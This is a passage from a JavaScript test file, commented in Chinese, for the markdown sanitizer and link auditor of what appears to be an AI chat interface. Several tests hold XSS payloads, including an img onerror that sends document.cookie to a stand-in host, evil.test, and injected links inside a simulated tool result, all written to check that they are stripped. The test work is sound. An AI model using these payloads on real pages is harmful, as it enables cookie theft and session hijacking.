eq(M.auditLinks('![](/logo.png)\n![](data:image/png;base64,iVBORw0)', []).offending.length, 0, 'F-04g 站内路径和 data: 放行')

// F-05 危险 scheme
{
  const out = M.sanitizeInline('点[这里](javascript:alert(1))看看')
  ok(!out.includes('javascript:'), 'F-05 ★ javascript: href 被清掉')
  ok(out.includes('点'), 'F-05b 文字保留')
  ok(!M.sanitizeInline('[x](VBScript:msgbox(1))').includes('script:'), 'F-05c 大小写变体也清')
}

// F-06 内联 HTML 的事件处理器
{
  const out = M.sanitizeInline('<img src=x onerror="fetch(\'//evil.test/\'+document.cookie)">')
  ok(!out.includes('onerror'), 'F-06 ★ onerror 属性被去掉')
  ok(!M.sanitizeInline('<div ONLOAD=x>').includes('ONLOAD'), 'F-06b 大写也去掉')
  ok(
    !M.sanitizeInline('<script>fetch("//evil.test")</script>').includes('evil.test'),
    'F-06c script 连内容一起去掉',
  )
}

// F-07 ★★ 工具结果走同一条路径
{
  // 一个"文件内容"，里面藏了注入。★ 它不是模型说的话，但同样不可信。
  const toolResult = '// TODO: fix\n![](https://evil.test/x?d=fromfile)\n<img src=y onerror=go()>'
  const a = M.auditLinks(toolResult, [])
  eq(a.offending.length, 2, 'F-07 ★★ 工具结果里的外链同样被扫出来（文件内容也来自外部）')
  ok(!M.sanitizeInline(toolResult).includes('onerror'), 'F-07b 工具结果同样走清理')
}

// ─────────────────────────────────────────────────────────────

console.log()
if (failures.length === 0) {
  console.log(green(`  ✓ ${passed} 条断言全部通过`))
  console.log(
    dim(
      '\n  这 68 条里最该记住的六条：\n' +
        '    A-19  穷举切割点——它一条就能抓住整个分帧实现的所有漏洞\n' +
        '    B-04  没有 step 边界时 reset 清空全部（「无边界」的边界情况）\n' +
        '    B-10  未知 chunk 类型不抛错（严格校验在这里是 bug 不是美德）\n' +
        '    C-06  max_tokens 截断要撤回，而这条路上没有任何错误信号\n' +
        '    D-01  交错的并行参数不串台（这个 bug 在单调用时完全不可见）\n' +
        '    E-01  组件卸载**不要**停止生成（和 React 的本能正面冲突）\n',
    ),
  )
  process.exit(0)
} else {
  console.log(red(`  ${failures.length} 条失败，${passed} 条通过`))
  process.exit(1)
}
